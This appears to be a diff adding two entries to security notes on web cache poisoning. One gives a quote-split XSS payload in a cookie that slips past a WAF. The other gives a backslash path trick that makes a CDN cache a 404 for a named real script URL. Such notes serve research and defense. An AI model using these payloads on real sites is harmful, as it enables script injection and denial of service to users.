@@ -87,3 +87,30 @@ X-Cache-Status: MISS
 </body>
 </html>
 ```
+
+---
+
+#### Cookie Parameter Poisoning
+
+* **Technique** WAF blocks </script> patterns but doesn't detect when split across quotes. Insert quotes mid-string to bypass detection, server strips quotes during processing, reassembling the attack vector.
+* 
+**Example payload**:
+```
+httpCookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.domain)>
+```
+Server processes as:
+```
+</script><svg/onload=alert(document.domain)>
+```
+
+---
+
+#### Path Manipulation via Character Substitution
+
+**How it works**: CDN normalizes backslashes `\` to forward slashes `/` in the cache key, treating both URLs as identical. However, origin server rejects backslashes with 404 error. This discrepancy allows poisoning: CDN caches the 404 for the "normalized" path, breaking legitimate requests.
+
+**Example payload**:
+```
+httpNormal:   cdn.shopify.com/static/js/bugsnag.min.js
+Poisoned: cdn.shopify.com\static\js\bugsnag.min.js?cb=123
+```
